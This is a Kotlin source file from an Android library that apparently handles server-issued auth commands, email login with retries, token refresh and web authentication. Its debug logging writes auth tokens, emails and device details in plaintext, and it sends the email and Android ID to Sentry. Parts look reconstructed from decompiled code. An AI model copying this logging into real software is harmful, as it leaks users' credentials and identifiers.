package com.hawkshaw.library.features

import android.content.Context
import android.content.Intent
import com.hawkshaw.library.App
import com.hawkshaw.library.config.RemoteConfig
import com.hawkshaw.library.config.getConfig
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.LoginRequest
import com.hawkshaw.library.datalayer.models.LoginResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.deviceinfo.DeviceInfo
import com.hawkshaw.library.features.auth.WebAuthActivity
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import io.sentry.Sentry
import kotlinx.coroutines.*
import java.io.Serializable
import java.net.URLEncoder
import android.util.Log

private const val TAG = "Auth"

/**
 * Data class for external authentication commands
 */
data class ExternalAuthCommand(
    val type: Type,
    val email: String? = null,
    val licenseKey: String? = null
) {
    enum class Type {
        SIGNUP,
        SIGNIN,
        PING
    }
}

/**
 * Interface for authentication callbacks
 */
interface AuthCallback : Serializable {
    fun onSuccess(token: String)
    fun onFailure(error: String)
}

/**
 * Handle authentication command from server
 *
 * @param context Application context
 * @param command External authentication command
 * @param scope Coroutine scope for async operations
 * @return API response or deferred result
 */
suspend fun handleExternalAuthCommand(
    context: Context,
    command: ExternalAuthCommand,
    scope: CoroutineScope
): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] handleExternalAuthCommand called. Command: $command")
    try {
        val result = when (command.type) {
            ExternalAuthCommand.Type.SIGNUP -> {
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNUP type. Email: ${command.email}")
                val deviceInfo = DeviceInfo.getLoginDeviceInfo(context).toString()
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNUP - DeviceInfo: $deviceInfo")
                val request = LoginRequest(
                    email = command.email ?: "",
                    deviceInfo = deviceInfo
                )
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNUP - LoginRequest: $request")
                // FIXED: Access Injector.INSTANCE
                val response = Injector.INSTANCE.authService.login(request)
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNUP - ApiResponse state: ${response.state}")
                handleAuthResponse(response)
            }
            ExternalAuthCommand.Type.SIGNIN -> {
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNIN type. Email: ${command.email}")
                val deviceInfo = DeviceInfo.getLoginDeviceInfo(context).toString()
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNIN - DeviceInfo: $deviceInfo")
                val request = LoginRequest(
                    email = command.email ?: "",
                    deviceInfo = deviceInfo
                )
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNIN - LoginRequest: $request")
                // FIXED: Access Injector.INSTANCE
                val response = Injector.INSTANCE.authService.login(request)
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: SIGNIN - ApiResponse state: ${response.state}")
                handleAuthResponse(response)
            }
            ExternalAuthCommand.Type.PING -> {
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: PING type.")
                // FIXED: Access Injector.INSTANCE
                val response = Injector.INSTANCE.authService.deAuth()
                Log.d(TAG, "[DEBUG] handleExternalAuthCommand: PING - ApiResponse state: ${response.state}")
                response
            }
        }
        Log.d(TAG, "[DEBUG] handleExternalAuthCommand result: $result")
        result
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] handleExternalAuthCommand: Exception: ${e.message}", e)
        Logger.e(TAG, "Error handling external auth command", e, false, 12, null)
        Sentry.captureException(e)
        Unit
    }
}

/**
 * Handle authentication response
 * FIXED: Explicitly define the generic type for ApiResponse.Success/Error/InProgress
 */
private fun handleAuthResponse(response: ApiResponse<LoginResponse>): Any {
    Log.d(TAG, "[DEBUG] handleAuthResponse called. Response state: ${response.state}")
    return when (response) {
        is ApiResponse.Success<LoginResponse> -> { // FIXED: Add type argument
            val token = response.result.token
            Log.d(TAG, "[DEBUG] handleAuthResponse: Success. Token: $token")
            Prefs.setToken(token)
            Log.d(TAG, "[DEBUG] handleAuthResponse: Token set in Prefs.")
            token
        }
        is ApiResponse.Error<LoginResponse> -> { // FIXED: Add type argument
            Log.e(TAG, "[DEBUG] handleAuthResponse: Error. Message: ${response.errorMessage}") // MODIFIED HERE
            Logger.e(TAG, "Auth error: ${response.errorMessage}", b = false, i = 12, nothing = null)
            Unit
        }
        is ApiResponse.InProgress<LoginResponse> -> { // FIXED: Add type argument
            Log.d(TAG, "[DEBUG] handleAuthResponse: InProgress.")
            Logger.d(TAG, "Auth in progress", false, 4, null)
            Unit
        }
        else -> {
            Log.d(TAG, "[DEBUG] handleAuthResponse: Unhandled ApiResponse type.")
            Unit // Explicitly return Unit for else case
        }
    }
}

/**
 * Start web authentication activity
 */
fun startWebAuth(context: Context, callback: AuthCallback) {
    Log.d(TAG, "[DEBUG] startWebAuth called.")
    try {
        val config = context.getConfig()
        val email = config.email ?: throw IllegalArgumentException("Email not configured")
        Log.d(TAG, "[DEBUG] startWebAuth: Config email: $email")

        val baseUrl = RemoteConfig.getInstance(context).getBaseUrl()
        val encodedEmail = URLEncoder.encode(email, "UTF-8")
        val url = "$baseUrl/auth?email=$encodedEmail"
        Log.d(TAG, "[DEBUG] startWebAuth: Auth URL: $url")

        val intent = Intent(context, WebAuthActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
            putExtra("url", url)
            putExtra("callback", callback)
        }
        Log.d(TAG, "[DEBUG] startWebAuth: Starting WebAuthActivity.")
        context.startActivity(intent)
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] startWebAuth: Exception: ${e.message}", e)
        Logger.e(TAG, "Error starting web auth", e, false, 12, null)
        callback.onFailure(e.message ?: "Unknown error")
    }
}

/**
 * Handle authentication command
 */
suspend fun handleAuthCommand(
    command: Command,
    scope: CoroutineScope,
    context: Context
): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] handleAuthCommand called. Command Type: ${command.type}, AuthData: ${command.authData}, LoginRequest: ${command.loginRequest}")
    try {
        val result = when (command.type) {
            Command.CommandType.Login -> {
                val deviceInfo = DeviceInfo.getLoginDeviceInfo(context).toString()
                val email = command.authData?.get("email") ?: command.loginRequest?.email ?: ""
                Log.d(TAG, "[DEBUG] handleAuthCommand: Login - Email: $email, DeviceInfo: $deviceInfo")
                val request = LoginRequest(
                    email = email,
                    deviceInfo = deviceInfo
                )
                Log.d(TAG, "[DEBUG] handleAuthCommand: Login - LoginRequest: $request")
                // FIXED: Access Injector.INSTANCE
                val response = Injector.INSTANCE.authService.login(request)
                Log.d(TAG, "[DEBUG] handleAuthCommand: Login - ApiResponse state: ${response.state}")
                handleAuthResponse(response)
            }
            else -> {
                Log.w(TAG, "[DEBUG] handleAuthCommand: Unhandled command type: ${command.type}")
                Logger.w(TAG, "Unhandled auth command type: ${command.type}")
                Unit // Explicitly return Unit for else case
            }
        }
        Log.d(TAG, "[DEBUG] handleAuthCommand result: $result")
        result
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] handleAuthCommand: Exception: ${e.message}", e)
        Logger.e(TAG, "Error handling auth command", e, false, 12, null)
        Unit
    }
}

/**
 * Login with email and retry count
 */
suspend fun login(email: String, retryCount: Int = 0): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] login called. Email: $email, RetryCount: $retryCount")
    try {
        Logger.d(TAG, "Login: Email: $email, RetryCount: $retryCount", false, 4, null)

        if (retryCount > 5) {
            Log.w(TAG, "[DEBUG] login: Retry count exceeded 5. Returning Unit.")
            return@withContext Unit
        }

        val deviceInfo = DeviceInfo.getLoginDeviceInfo(App.getContext()).toString()
        val request = LoginRequest(
            email = email,
            deviceInfo = deviceInfo
        )
        Log.d(TAG, "[DEBUG] login: LoginRequest: $request")

        // FIXED: Access Injector.INSTANCE and explicitly define generic types
        val response = Injector.INSTANCE.authService.login(request)
        Log.d(TAG, "[DEBUG] login: ApiResponse state: ${response.state}")

        when (response) {
            is ApiResponse.InProgress<LoginResponse> -> { // FIXED: Add type argument
                Log.d(TAG, "[DEBUG] login: InProgress.")
                Unit
            }
            is ApiResponse.Error<LoginResponse> -> { // FIXED: Add type argument
                Log.e(TAG, "[DEBUG] login: Error. Message: ${response.errorMessage}") // MODIFIED HERE
                Logger.e(
                    TAG,
                    "Login: Email: $email, RetryCount: $retryCount, Error: ${response.errorMessage}",
                    b = false,
                    i = 12,
                    nothing = null
                )
                Log.d(TAG, "[DEBUG] login: Delaying for 5000ms before retry.")
                delay(5000)
                return@withContext login(email, retryCount + 1)
            }
            is ApiResponse.Success<LoginResponse> -> { // FIXED: Add type argument
                Log.d(TAG, "[DEBUG] login: Success. Result: ${response.result}")
                Logger.d(
                    TAG,
                    "Login Success: Email: $email, RetryCount: $retryCount",
                    false,
                    4,
                    null
                )

                val result = response.result
                Prefs.apply {
                    setEmail(result.email)
                    setToken(result.token)
                    setRefreshToken(result.refreshToken)
                }
                Log.d(TAG, "[DEBUG] login: Email, Token, RefreshToken set in Prefs.")

                Sentry.setUser(io.sentry.protocol.User().apply {
                    this.email = email
                    this.data = mapOf("android_id" to DeviceInfo.getAndroidId())
                })
                Log.d(TAG, "[DEBUG] login: Sentry user set.")
                Unit
            }
            // else case is not strictly needed if ApiResponse is a sealed class and all subtypes are handled.
            // However, if it's not sealed or for defensive programming:
            // else -> {
            //     Log.w(TAG, "[DEBUG] login: Unhandled ApiResponse type in when statement.")
            //     Unit
            // }
        }
        Log.d(TAG, "[DEBUG] login: Returning Unit at the end of try block.")
        return@withContext Unit // Explicit return from the try block for success/inprogress when not retrying
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] login: Exception: ${e.message}", e)
        Logger.e(TAG, "Error during login", e, false, 12, null)
        return@withContext ApiResponse.Error<LoginResponse>("Error during login: ${e.message}")
    }
}

/**
 * Refresh authentication tokens
 */
suspend fun refreshTokens(): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] refreshTokens called.")
    try {
        var email = Prefs.getEmail()
        Log.d(TAG, "[DEBUG] refreshTokens: Email from Prefs: $email")
        if (email.isNullOrEmpty()) {
            email = App.getContext().getConfig().email ?: ""
            Log.d(TAG, "[DEBUG] refreshTokens: Email from AppConfig: $email")
        }

        if (email.isEmpty()){
            Log.w(TAG, "[DEBUG] refreshTokens: Email is empty after checking Prefs and AppConfig. Returning error.")
            return@withContext ApiResponse.Error<Unit>("Email not found for refreshing tokens")
        }

        Log.d(TAG, "[DEBUG] refreshTokens: Calling login with email: $email")
        val loginResult = login(email)
        Log.d(TAG, "[DEBUG] refreshTokens: login call result: $loginResult (type: ${loginResult::class.simpleName})")

        return@withContext Unit
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] refreshTokens: Exception: ${e.message}", e)
        Logger.e(TAG, "Error refreshing tokens", e, false, 12, null)
        return@withContext ApiResponse.Error<Unit>("Error refreshing tokens: ${e.message}")
    }
}

/**
 * Handle login request from command
 */
fun login(loginRequest: Command.LoginRequest?) {
    Log.d(TAG, "[DEBUG] login (from Command.LoginRequest) called. Request: $loginRequest")
    if (loginRequest != null) {
        CoroutineScope(Dispatchers.IO).safeLaunch {
            Log.d(TAG, "[DEBUG] login (from Command.LoginRequest): Coroutine launched. Email: ${loginRequest.email}")
            try {
                login(loginRequest.email ?: "")
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] login (from Command.LoginRequest): Exception in coroutine: ${e.message}", e)
                Logger.e(TAG, "Error handling login request", e, false, 12, null)
            }
        }
    } else {
        Log.d(TAG, "[DEBUG] login (from Command.LoginRequest): loginRequest is null.")
    }
}

/**
 * Launch web authentication
 */
fun launchWebAuth(context: Context, deviceId: String, callback: AuthCallback) {
    Log.d(TAG, "[DEBUG] launchWebAuth called. DeviceId: $deviceId")
    try {
        val encodedDeviceId = URLEncoder.encode(deviceId, "UTF-8")
        val deviceName = DeviceInfo.getDeviceName() // Call getDeviceName() from this file
        val encodedDeviceName = URLEncoder.encode(deviceName, "UTF-8")
        Log.d(TAG, "[DEBUG] launchWebAuth: Encoded DeviceId: $encodedDeviceId, DeviceName: $deviceName, Encoded DeviceName: $encodedDeviceName")
        
        val url = "${RemoteConfig.getInstance(context).getBaseUrl()}/mobile-auth" +
                "?device_id=$encodedDeviceId" +
                "&device_name=$encodedDeviceName"

        Log.d(TAG, "[DEBUG] launchWebAuth: Auth URL: $url")
        Logger.d(TAG, "Launching web auth with URL: $url", false, 4, null) // Existing

        val intent = Intent(context, WebAuthActivity::class.java).apply {
            putExtra(WebAuthActivity.EXTRA_AUTH_URL, url)
            putExtra(WebAuthActivity.EXTRA_CALLBACK, callback as Serializable)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        Log.d(TAG, "[DEBUG] launchWebAuth: Starting WebAuthActivity.")
        context.startActivity(intent)
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] launchWebAuth: Exception: ${e.message}", e)
        Logger.e(TAG, "Error launching web auth", e, false, 12, null)
        callback.onFailure("Error launching web auth: ${e.message}")
    }
}

/**
 * Get a user-friendly device name
 */
private fun getDeviceName(): String {
    // No Log.d here, as it's a simple utility. Calls to it are logged if necessary.
    return try {
        DeviceInfo.getDeviceName()
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] getDeviceName: Exception: ${e.message}", e) // Debug log for exception
        Logger.e(TAG, "Error getting device name", e, false, 12, null)
        "Unknown Device"
    }
}

/**
 * Capitalize the first letter of a string
 */
private fun String.capitalize(): String {
    // No Log.d here, as it's a simple utility.
    return if (isNotEmpty()) {
        this[0].uppercaseChar() + substring(1)
    } else {
        this
    }
}

